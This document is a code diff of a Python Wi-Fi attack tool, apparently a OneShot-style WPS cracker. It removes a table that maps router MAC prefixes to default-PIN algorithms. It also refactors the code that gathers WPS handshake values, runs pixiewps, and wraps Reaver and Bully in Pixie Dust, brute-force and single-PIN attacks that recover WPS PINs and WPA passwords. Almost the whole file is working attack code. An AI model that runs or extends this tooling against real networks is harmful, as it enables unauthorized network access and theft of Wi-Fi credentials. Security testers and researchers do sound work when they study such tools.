-    'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97','1CAFF7','3C1E04','10BEF5','78321B','C4A81D','908D78','F07D68','346BD3','6C198F'),
-    'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1','1CAFF7','3C1E04','10BEF5','78321B','F07D68','281878','C4E984'),
-    'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4','04421A','D45D64','70825E','3C7C3F','FCECDA','3497F6','708105','AC2205'),
-    'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97','D084B0','84A423','8C10D4','E4BEED','B85510','C891F9','3C1E04','40F201','181E78'),
-    'pinInvNIC': ('00904C','EC6264','14144B','988B5D','001AA9','ACF1DF','BCF685','00E04C','001CDF','002275','C83A35','B4944E'),
-    'pinNIC2': ('D4BF7F','F8C091','784476','0014D1','144D67'),
-    'pinNIC3': ('F8C091','D4BF7F','784476'),
-    'pinOUIaddNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685','00E04C','08C6B3','007263','000C42','000EE8'),
-    'pinOUIxorNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685'),
-    'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C','F0B429','741EA2','D4214D','E0E751','2C39C1','0C54A5','78C1A7','6C72E7','D8EB46','7442C1','B0B98A','F85E42','30B5C2','C8D719','240995','18A6F7'),
-    'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5','0023BE','002369','0025B3','000F8F','0012D9','001217','00182A','000625','00166F','001839','001A70','001C10','001E4A','002163','006B4F'),
-    'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264','20E52A','3CA72B','E44790','5CF370','D0D04B'),
-    'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','20E52A','3CA72B','E44790'),
-    'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C','20E52A','3CA72B','E44790'),
-    'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9','20E52A','3CA72B','E44790','5CF370','D0D04B'),
-    'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9','20E52A','3CA72B','E44790','5CF370','D0D04B'),
-    'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9','20E52A','3CA72B','E44790','5CF370','D0D04B'),
-    'pinAirc1': ('181E78','40F201','44E9DD','D084B0','84A423','8C10D4','3C1E04'),
-    'pinAirc2': ('84A423','8C10D4','88A6C6','181E78','40F201','44E9DD'),
-    'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516','1CAFF7','78321B','F07D68','C4A81D'),
-    'pinRealtek1': ('0014D1','000C42','000EE8','00E04C','E4BEED','08C6B3','007263','B85510'),
-    'pinRealtek2': ('007263','E4BEED','00E04C','0014D1','08C6B3'),
-    'pinRealtek3': ('08C6B3','00E04C','007263','E4BEED'),
-    'pinUpvel': ('784476','D4BF7F0','F8C091'),
-    'pinUR814AC': ('D4BF7F60',),
-    'pinUR825AC': ('D4BF7F5',),
-    'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
-    'pinEdimax': ('801F02','00E04C','74DA38','80D01D'),
-    'pinThomson': ('002624','4432C8','88F7C7','CC03FA','BC7670','7822DF','782E29','FC946C','A0F3C1','64680C','04FE31'),
-    'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF','4C8BEF','4CB16C','C8D15E','D46E5C','EC233D','ECCB30','F49FF3','007822','00259E','001882','00E0FC','001E10','0019CB','006331','78D99F'),
-    'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897','E068E7','5CE286','CC7B35','84A8E4','18C58A','44F436','00265E','002293','002662','741F4A','283B82','74A063'),
-    'pinONO': ('5C353B','DC537C','E0CA94','1C3991','40167E','5853AF'),
-    'pinTenda': ('C83A35','001CC3','D85D4C','B0B2DC','CC5D4E','9C216A','BCDAFE','EC26CA','28EE52','C4F0EC','D021FA','302481','58605F','808132','A4F4C2','F42896'),
-    'pinTPLink1': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332','9094E4','5C899A','14CF92','6CE873','2C4D54','640DE6','B4B024','B0C745','3C46D8','1C3BF3','AC84C6','F0A731','ECA940','D8075A'),
-    'pinTPLink2': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332','D8075A','ECA940','AC84C6','640DE6','B4B024'),
-    'pinNetgear1': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E46F13','E0469A','300D43','001E2A','001B2F','001F33','002636','008EF2','20E52A','2CB05D','3CA72B','C43DC7','C8B373','E44790','F87394','CC40D0','6CB0CE','A42B8C','6CDA23'),
-    'pinNetgear2': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E0469A','300D43','001E2A','001B2F','20E52A','3CA72B','C43DC7','C8B373','E44790'),
-    'pinZTE1': ('4C09B4','4CAC0A','9CD24B','B075D5','C864C7','DC028E','FCC897','E068E7','5CE286','CC7B35','84A8E4','18C58A','44F436','283B82'),
-    'pinZTE2': ('4C09B4','4CAC0A','9CD24B','C864C7','DC028E','FCC897','E068E7','CC7B35','84A8E4','18C58A'),
-}
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return oui ^ nic
 
 
 # ---------------------------------------------------------------------------
-# PixiewpsData — with --force bypass, R-S parsing, capture file IO
+# PixiewpsData
 # ---------------------------------------------------------------------------
-def get_hex(line):
-    parts = line.split(':', 3)
-    if len(parts) < 3: return ''
-    return parts[2].replace(' ', '').upper()
-
-
 class PixiewpsData:
-    _REQUIRED_HEX_FIELDS = {'pke': 384, 'pkr': 384, 'e_nonce': 32,
-                            'authkey': 64, 'e_hash1': 64, 'e_hash2': 64}
-    _OPTIONAL_HEX_FIELDS = {'r_nonce': 32, 'e_s1': 32, 'e_s2': 32,
-                            'r_s1': 32, 'r_s2': 32}
+    _REQUIRED_HEX_FIELDS = {
+        'pke': 384, 'pkr': 384, 'e_nonce': 32,
+        'authkey': 64, 'e_hash1': 64, 'e_hash2': 64,
+    }
+    _OPTIONAL_HEX_FIELDS = {
+        'r_nonce': 32, 'e_s1': 32, 'e_s2': 32,
+        'r_s1': 32, 'r_s2': 32,
+    }
     _ALL_HEX_FIELDS = {**_REQUIRED_HEX_FIELDS, **_OPTIONAL_HEX_FIELDS}
 
     _RE_WPA = {
@@ -753,234 +966,322 @@ class PixiewpsData:
         'e_s1':    re.compile(r'E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
         'e_s2':    re.compile(r'E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
     }
+    _RE_PIXIE_PIN = re.compile(r'\[#\]\s*WPS\s+pin\s*[:=]\s*(\d+)', re.I)
+    _RE_PIXIE_PSK = re.compile(r'\[#\]\s*WPA\s+PSK\s*[:=]\s*(.+)', re.I)
 
     def __init__(self):
-        for f in self._ALL_HEX_FIELDS: setattr(self, f, '')
+        self.pke = ''
+        self.pkr = ''
+        self.e_hash1 = ''
+        self.e_hash2 = ''
+        self.authkey = ''
+        self.e_nonce = ''
+        self.r_nonce = ''
+        self.e_s1 = ''
+        self.e_s2 = ''
+        self.r_s1 = ''
+        self.r_s2 = ''
 
-    def clear(self): self.__init__()
-    def got_all(self): return all(getattr(self, f) for f in self._REQUIRED_HEX_FIELDS)
-    def missing_fields(self): return [f for f in self._REQUIRED_HEX_FIELDS if not getattr(self, f)]
+    def clear(self):
+        self.__init__()
+
+    def got_all(self):
+        return all(getattr(self, f) for f in self._REQUIRED_HEX_FIELDS)
+
+    def missing_fields(self):
+        return [f for f in self._REQUIRED_HEX_FIELDS if not getattr(self, f)]
+
+    def populated_fields(self):
+        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS
+                if getattr(self, f)}
+
     def completeness(self):
-        return sum(1 for f in self._REQUIRED_HEX_FIELDS if getattr(self, f)), len(self._REQUIRED_HEX_FIELDS)
+        filled = sum(1 for f in self._REQUIRED_HEX_FIELDS if getattr(self, f))
+        return filled, len(self._REQUIRED_HEX_FIELDS)
 
     def status_line(self):
-        f, t = self.completeness()
-        if f == t: return UI.ok(f'{f}/{t} fields captured — ready for pixiewps')
-        return UI.warn(f'{f}/{t} fields captured (missing: {", ".join(self.missing_fields())})')
+        filled, total = self.completeness()
+        if filled == total:
+            return UI.ok(f'{filled}/{total} fields captured — ready for pixiewps')
+        missing = ', '.join(self.missing_fields())
+        return UI.warn(f'{filled}/{total} fields captured (missing: {missing})')
 
     def _validate(self, strict=True):
+        fields = self._REQUIRED_HEX_FIELDS if strict else {}
         for name, length in self._ALL_HEX_FIELDS.items():
             v = getattr(self, name)
             if not v:
-                if strict and name in self._REQUIRED_HEX_FIELDS:
+                if name in fields:
                     raise ValueError(f'Required field {name} is empty')
                 continue
-            if len(v) != length:
-                raise ValueError(f'Field {name} has length {len(v)}, expected {length}')
-            if not all(c in '0123456789ABCDEF' for c in v.upper()):
+            v_upper = v.upper()
+            if len(v_upper) != length:
+                raise ValueError(
+                    f'Field {name} has length {len(v_upper)}, expected {length}')
+            if not all(c in '0123456789ABCDEF' for c in v_upper):
                 raise ValueError(f'Field {name} is not valid hex')
 
     def get_pixie_args(self, full_range=False, timeout=None):
-        self._validate(strict=not full_range)
+        self._validate()
         args = ['pixiewps',
                 '--pke', self.pke, '--pkr', self.pkr,
                 '--e-hash1', self.e_hash1, '--e-hash2', self.e_hash2,
                 '--authkey', self.authkey, '--e-nonce', self.e_nonce]
-        for f, flag in (('r_nonce', '--r-nonce'), ('e_s1', '--e-s1'),
-                        ('e_s2', '--e-s2'), ('r_s1', '--r-s1'), ('r_s2', '--r-s2')):
-            v = getattr(self, f)
-            if v: args.extend([flag, v])
-        if full_range: args.append('--force')
-        if timeout is not None: args.extend(['--timeout', str(int(timeout))])
+        if self.r_nonce:
+            args.extend(['--r-nonce', self.r_nonce])
+        if self.e_s1:
+            args.extend(['--e-s1', self.e_s1])
+        if self.e_s2:
+            args.extend(['--e-s2', self.e_s2])
+        if self.r_s1:
+            args.extend(['--r-s1', self.r_s1])
+        if self.r_s2:
+            args.extend(['--r-s2', self.r_s2])
+        if full_range:
+            args.append('--force')
+        if timeout is not None:
+            args.extend(['--timeout', str(int(timeout))])
         return args
 
-    def _parse(self, text, patterns):
-        n = 0
+    def get_pixie_cmd(self, full_range=False, timeout=None):
+        return ' '.join(self.get_pixie_args(full_range, timeout))
+
+    def run_pixiewps(self, full_range=False, timeout=None, verbose=False):
+        if not shutil.which('pixiewps'):
+            print(UI.msg('err', 'pixiewps not found in PATH'))
+            return None, None
+        args = self.get_pixie_args(full_range, timeout)
+        try:
+            proc = subprocess.run(
+                args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8', errors='replace', timeout=timeout or 300)
+        except subprocess.TimeoutExpired:
+            print(UI.msg('err', 'pixiewps timed out'))
+            return None, None
+        except Exception as e:
+            print(UI.msg('err', f'pixiewps execution error: {e}'))
+            return None, None
+        output = proc.stdout or ''
+        if verbose:
+            for line in output.splitlines():
+                print(f'  {UI.muted("[pixiewps]")} {line}')
+        pin = None
+        psk = None
+        for line in output.splitlines():
+            m = self._RE_PIXIE_PIN.search(line)
+            if m:
+                pin = m.group(1)
+            m = self._RE_PIXIE_PSK.search(line)
+            if m:
+                psk = m.group(1).strip()
+        return pin, psk
+
+    def _parse_output(self, text, patterns):
+        count = 0
         for field, rx in patterns.items():
             m = rx.search(text)
             if m:
-                val = m.group(1).upper().strip()
-                if val and not getattr(self, field):
-                    setattr(self, field, val); n += 1
-        return n
+                value = m.group(1).upper().strip()
+                if value and not getattr(self, field):
+                    setattr(self, field, value)
+                    count += 1
+        return count
 
-    def from_wpa_supplicant(self, t): return self._parse(t, self._RE_WPA)
-    def from_reaver(self, t):         return self._parse(t, self._RE_REAVER)
-    def from_bully(self, t):          return self._parse(t, self._RE_BULLY)
+    def from_wpa_supplicant(self, text):
+        return self._parse_output(text, self._RE_WPA)
+
+    def from_reaver(self, text):
+        return self._parse_output(text, self._RE_REAVER)
+
+    def from_bully(self, text):
+        return self._parse_output(text, self._RE_BULLY)
+
+    def from_any_backend(self, text):
+        total = self.from_wpa_supplicant(text)
+        total += self.from_reaver(text)
+        total += self.from_bully(text)
+        return total
 
     def to_dict(self):
-        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS if getattr(self, f)}
+        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS
+                if getattr(self, f)}
+
     @classmethod
-    def from_dict(cls, d):
-        o = cls()
-        for f in cls._ALL_HEX_FIELDS:
-            v = d.get(f, '')
-            if v: setattr(o, f, v.upper().strip())
-        return o
-    def to_json(self): return json.dumps(self.to_dict(), indent=2)
+    def from_dict(cls, data):
+        obj = cls()
+        for field in cls._ALL_HEX_FIELDS:
+            v = data.get(field, '')
+            if v:
+                setattr(obj, field, v.upper().strip())
+        return obj
+
+    def to_json(self):
+        import json
+        return json.dumps(self.to_dict(), indent=2)
+
     @classmethod
-    def from_json(cls, s): return cls.from_dict(json.loads(s))
+    def from_json(cls, json_str):
+        import json
+        return cls.from_dict(json.loads(json_str))
 
     def __repr__(self):
-        f, t = self.completeness()
-        return f'PixiewpsData({f}/{t} required, ready={self.got_all()})'
+        filled, total = self.completeness()
+        extras = sum(1 for f in self._OPTIONAL_HEX_FIELDS if getattr(self, f))
+        return (f'PixiewpsData({filled}/{total} required, '
+                f'{extras} optional, '
+                f'ready={self.got_all()})')
 
 
 # ---------------------------------------------------------------------------
-# AttackResult
+# Attack backends
 # ---------------------------------------------------------------------------
+BACKEND_INTERNAL = 'internal'
+BACKEND_REAVER = 'reaver'
+BACKEND_BULLY = 'bully'
+BACKENDS = (BACKEND_INTERNAL, BACKEND_REAVER, BACKEND_BULLY)
+
+
 class AttackResult:
     __slots__ = ('success', 'pin', 'psk', 'essid', 'error')
+
     def __init__(self, success=False, pin='', psk='', essid='', error=''):
-        self.success, self.pin, self.psk = success, pin, psk
-        self.essid, self.error = essid, error
-    def __bool__(self): return self.success
+        self.success = success
+        self.pin = pin
+        self.psk = psk
+        self.essid = essid
+        self.error = error
+
+    def __bool__(self):
+        return self.success
+
     def __repr__(self):
-        return (f'AttackResult(success={self.success!r}, pin={self.pin!r}, '
-                f'psk={self.psk!r}, essid={self.essid!r}, error={self.error!r})')
-
-
-# ---------------------------------------------------------------------------
-# Monitor mode helpers
-# ---------------------------------------------------------------------------
-def _iface_exists(name): return os.path.exists(f'/sys/class/net/{name}')
+        if self.success:
+            return (f'AttackResult(success=True, pin={self.pin!r}, '
+                    f'psk={self.psk!r}, essid={self.essid!r})')
+        return f'AttackResult(success=False, error={self.error!r})'
 
 
 def setup_monitor_mode(iface):
     if shutil.which('airmon-ng'):
-        try:
-            run_proc(['airmon-ng', 'check', 'kill'],
-                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        except Exception: pass
-        try:
-            _, out = run_proc(['airmon-ng', 'start', iface],
-                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                              encoding='utf-8', errors='replace')
-        except Exception:
-            out = ''
-        for line in (out or '').splitlines():
+        subprocess.run(['airmon-ng', 'check', 'kill'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        r = subprocess.run(['airmon-ng', 'start', iface],
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                           encoding='utf-8', errors='replace')
+        for line in (r.stdout or '').splitlines():
             m = re.search(r'\b(\w+mon)\b', line)
-            if m and _iface_exists(m.group(1)):
+            if m:
                 return m.group(1)
-        cand = iface + 'mon'
-        if _iface_exists(cand): return cand
-        raise RuntimeError(f'Could not enter monitor mode on {iface!r}; '
-                           f'tried {cand!r} but it does not exist')
-    # iw fallback
-    run_proc(['ip', 'link', 'set', iface, 'down'],
-             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    run_proc(['iw', iface, 'set', 'monitor', 'none'],
-             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    run_proc(['ip', 'link', 'set', iface, 'up'],
-             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    if not _iface_exists(iface):
-        raise RuntimeError(f'{iface!r} disappeared after iw monitor attempt')
+        mon = iface + 'mon'
+        if os.path.exists(f'/sys/class/net/{mon}'):
+            return mon
+        return iface
+    subprocess.run(['ip', 'link', 'set', iface, 'down'],
+                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(['iw', iface, 'set', 'monitor', 'none'],
+                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(['ip', 'link', 'set', iface, 'up'],
+                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return iface
 
 
 def teardown_monitor_mode(iface, original_iface):
-    if iface and iface != original_iface and shutil.which('airmon-ng'):
-        run_proc(['airmon-ng', 'stop', iface],
-                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    elif iface != original_iface:
-        run_proc(['ip', 'link', 'set', iface, 'down'],
-                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        run_proc(['iw', iface, 'set', 'type', 'managed'],
-                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        run_proc(['ip', 'link', 'set', original_iface, 'up'],
-                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    if shutil.which('airmon-ng'):
+        subprocess.run(['airmon-ng', 'stop', iface],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    else:
+        subprocess.run(['ip', 'link', 'set', iface, 'down'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(['iw', iface, 'set', 'type', 'managed'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(['ip', 'link', 'set', original_iface, 'up'],
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
-# ---------------------------------------------------------------------------
-# External backends
-# ---------------------------------------------------------------------------
-class _BackendBase:
-    BIN = ''
-
-    def __init__(self, interface, verbose=False, timeout=1200,
-                 delay=None, json_mode=False, dry_run=False):
+class ReaverAttacker:
+    def __init__(self, interface, verbose=False, timeout=300,
+                 delay=None, json_mode=False):
         self.interface = interface
         self.verbose = verbose
         self.timeout = timeout
         self.delay = delay
         self.json_mode = json_mode
-        self.dry_run = dry_run
 
-    @classmethod
-    def is_available(cls):
-        return shutil.which(cls.BIN) is not None
+    @staticmethod
+    def is_available():
+        return shutil.which('reaver') is not None
 
-    def _run(self, argv, label, timeout=None):
+    def pixie_dust(self, bssid, channel=None):
+        argv = self._base_argv(bssid, channel)
+        argv += ['-K', '1']
+        return self._run(argv, label='Pixie Dust (reaver)')
+
+    def bruteforce(self, bssid, channel=None, start_pin=None):
+        argv = self._base_argv(bssid, channel)
+        if self.delay is not None:
+            argv += ['-d', str(int(self.delay))]
+        if start_pin:
+            argv += ['-p', start_pin]
+        return self._run(argv, label='Brute-force (reaver)',
+                         timeout=self.timeout * 10)
+
+    def single_pin(self, bssid, pin, channel=None):
+        argv = self._base_argv(bssid, channel)
+        argv += ['-p', pin]
+        return self._run(argv, label=f'PIN {pin} (reaver)')
+
+    def pbc(self, bssid=None, channel=None):
+        argv = ['reaver', '-i', self.interface]
+        if bssid:
+            argv += ['-b', bssid]
+        if channel:
+            argv += ['-c', str(channel)]
+        argv += ['--pbc']
+        argv += ['-vv'] if self.verbose else ['-v']
+        argv += ['-L', '-N']
+        return self._run(argv, label='Push Button Connect (reaver)')
+
+    def _base_argv(self, bssid, channel=None):
+        argv = ['reaver', '-i', self.interface, '-b', bssid]
+        if channel:
+            argv += ['-c', str(channel)]
+        argv += ['-vv'] if self.verbose else ['-v']
+        argv += ['-L', '-N']
+        return argv
+
+    def _run(self, argv, label='reaver', timeout=None):
         timeout = timeout or self.timeout
         print(UI.msg('run', f'Running {UI.hi(label)}…'))
-        if self.verbose or self.dry_run:
+        if self.verbose:
             print(f'  {UI.muted("[cmd]")} {" ".join(argv)}')
-        if self.dry_run:
-            return AttackResult(error='dry_run')
         try:
-            _, out = run_proc(argv, timeout=timeout,
-                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                              encoding='utf-8', errors='replace')
+            proc = subprocess.run(
+                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8', errors='replace', timeout=timeout)
         except subprocess.TimeoutExpired:
             print(UI.msg('err', f'{label} timed out after {timeout}s'))
             return AttackResult(error='timeout')
         except FileNotFoundError:
-            print(UI.msg('err', f'{self.BIN} binary not found in PATH'))
+            print(UI.msg('err', 'reaver binary not found in PATH'))
             return AttackResult(error='not_found')
-        if self.verbose: print(out or '')
-        return self._parse_output(out or '')
-
-    @staticmethod
-    def _parse_output(output):
-        return AttackResult(error='no_result')
-
-
-class ReaverAttacker(_BackendBase):
-    BIN = 'reaver'
-
-    def _base(self, bssid, channel=None, pixie=False):
-        argv = ['reaver', '-i', self.interface, '-b', bssid]
-        if channel: argv += ['-c', str(channel)]
-        argv += ['-vv'] if self.verbose else ['-v']
-        argv += ['-L']
-        if not pixie:
-            # -N suppresses the M5 NACK that flags a valid first half;
-            # only safe on non-Pixie paths where we don't need it.
-            argv += ['-N']
-        return argv
-
-    def pixie_dust(self, bssid, channel=None):
-        return self._run(self._base(bssid, channel, pixie=True) + ['-K', '1'],
-                         'Pixie Dust (reaver)')
-
-    def bruteforce(self, bssid, channel=None, start_pin=None):
-        argv = self._base(bssid, channel, pixie=False)
-        if self.delay is not None: argv += ['-d', str(int(self.delay))]
-        if start_pin: argv += ['-p', start_pin]
-        return self._run(argv, 'Brute-force (reaver)', timeout=self.timeout * 10)
-
-    def single_pin(self, bssid, pin, channel=None):
-        return self._run(self._base(bssid, channel) + ['-p', pin],
-                         f'PIN {pin} (reaver)')
-
-    def pbc(self, bssid=None, channel=None):
-        argv = ['reaver', '-i', self.interface]
-        if bssid: argv += ['-b', bssid]
-        if channel: argv += ['-c', str(channel)]
-        argv += ['--pbc']
-        argv += ['-vv'] if self.verbose else ['-v']
-        return self._run(argv, 'Push Button Connect (reaver)')
+        output = proc.stdout or ''
+        if self.verbose:
+            print(output)
+        return self._parse_output(output)
 
     @staticmethod
     def _parse_output(output):
         pin = psk = essid = ''
         for line in output.splitlines():
             m = re.search(r"\[\+\]\s*WPS\s*PIN:\s*'([^']*)'", line)
-            if m: pin = m.group(1)
+            if m:
+                pin = m.group(1)
             m = re.search(r"\[\+\]\s*WPA\s*PSK:\s*'([^']*)'", line)
-            if m: psk = m.group(1)
+            if m:
+                psk = m.group(1)
             m = re.search(r"\[\+\]\s*AP\s*SSID:\s*'([^']*)'", line)
-            if m: essid = m.group(1)
+            if m:
+                essid = m.group(1)
         if pin or psk:
             return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
         if 'WPS transaction failed' in output:
@@ -992,47 +1293,88 @@ class ReaverAttacker(_BackendBase):
         return AttackResult(error='no_result')
 
 
-class BullyAttacker(_BackendBase):
-    BIN = 'bully'
+class BullyAttacker:
+    def __init__(self, interface, verbose=False, timeout=300,
+                 delay=None, json_mode=False):
+        self.interface = interface
+        self.verbose = verbose
+        self.timeout = timeout
+        self.delay = delay
+        self.json_mode = json_mode
 
-    def _base(self, bssid, channel=None):
+    @staticmethod
+    def is_available():
+        return shutil.which('bully') is not None
+
+    def pixie_dust(self, bssid, channel=None):
+        argv = self._base_argv(bssid, channel)
+        argv += ['-d']
+        return self._run(argv, label='Pixie Dust (bully)')
+
+    def bruteforce(self, bssid, channel=None, start_pin=None):
+        argv = self._base_argv(bssid, channel)
+        if start_pin:
+            argv += ['-p', start_pin]
+        return self._run(argv, label='Brute-force (bully)',
+                         timeout=self.timeout * 10)
+
+    def single_pin(self, bssid, pin, channel=None):
+        argv = self._base_argv(bssid, channel)
+        argv += ['-p', pin]
+        return self._run(argv, label=f'PIN {pin} (bully)')
+
+    def _base_argv(self, bssid, channel=None):
         argv = ['bully', '-b', bssid]
-        if channel: argv += ['-c', str(channel)]
+        if channel:
+            argv += ['-c', str(channel)]
         argv += ['-v', '4'] if self.verbose else ['-v', '2']
         if self.delay is not None:
-            # bully -d is inter-pin delay in µs; -l is lockout wait (seconds)
-            argv += ['-d', str(int(self.delay * 1000))]
+            argv += ['-l', str(int(self.delay))]
         argv.append(self.interface)
         return argv
 
-    def pixie_dust(self, bssid, channel=None):
-        return self._run(self._base(bssid, channel) + ['-d'],
-                         'Pixie Dust (bully)')
-
-    def bruteforce(self, bssid, channel=None, start_pin=None):
-        argv = self._base(bssid, channel)
-        if start_pin: argv += ['-p', start_pin]
-        return self._run(argv, 'Brute-force (bully)', timeout=self.timeout * 10)
-
-    def single_pin(self, bssid, pin, channel=None):
-        return self._run(self._base(bssid, channel) + ['-p', pin],
-                         f'PIN {pin} (bully)')
+    def _run(self, argv, label='bully', timeout=None):
+        timeout = timeout or self.timeout
+        print(UI.msg('run', f'Running {UI.hi(label)}…'))
+        if self.verbose:
+            print(f'  {UI.muted("[cmd]")} {" ".join(argv)}')
+        try:
+            proc = subprocess.run(
+                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8', errors='replace', timeout=timeout)
+        except subprocess.TimeoutExpired:
+            print(UI.msg('err', f'{label} timed out after {timeout}s'))
+            return AttackResult(error='timeout')
+        except FileNotFoundError:
+            print(UI.msg('err', 'bully binary not found in PATH'))
+            return AttackResult(error='not_found')
+        output = proc.stdout or ''
+        if self.verbose:
+            print(output)
+        return self._parse_output(output)
 
     @staticmethod
     def _parse_output(output):
         pin = psk = essid = ''
         for line in output.splitlines():
-            m = re.search(r"\[\+\]\s*Pin\s+is\s+'([^']*)',\s*key\s+is\s+'([^']*)'", line)
+            m = re.search(
+                r"\[\+\]\s*Pin\s+is\s+'([^']*)',\s*key\s+is\s+'([^']*)'",
+                line)
             if m:
-                pin, psk = m.group(1), m.group(2); continue
+                pin, psk = m.group(1), m.group(2)
+                continue
             m = re.search(r"\[\*\]\s*Pin:\s*(\S+)", line)
-            if m and not pin: pin = m.group(1)
+            if m and not pin:
+                pin = m.group(1)
             m = re.search(r"\[\*\]\s*Key:\s*(.+)", line)
-            if m and not psk: psk = m.group(1).strip()
+            if m and not psk:
+                psk = m.group(1).strip()
             m = re.search(r"SSID:\s*'([^']*)'", line)
-            if m and not essid: essid = m.group(1)
+            if m and not essid:
+                essid = m.group(1)
             m = re.search(r"for\s+'([^']+)'", line)
-            if m and not essid: essid = m.group(1)
+            if m and not essid:
+                essid = m.group(1)
         if pin or psk:
             return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
         if 'WPS lockout' in output or 'locked' in output.lower():
@@ -1040,65 +1382,66 @@ class BullyAttacker(_BackendBase):
         return AttackResult(error='no_result')
 
 
-def _save_result(db, bssid, essid, pin, psk, reports_dir, json_mode, json_stdout):
-    """Single save path used by both internal and external backends."""
-    _safe_makedirs(reports_dir)
-    filename = os.path.join(reports_dir, 'stored')
-    dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
-    try:
-        with open(filename + '.txt', 'a', encoding='utf-8') as f:
-            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
-                    f'WPS PIN: {pin}\nWPA PSK: {psk}\n\n')
-        header = not os.path.isfile(filename + '.csv')
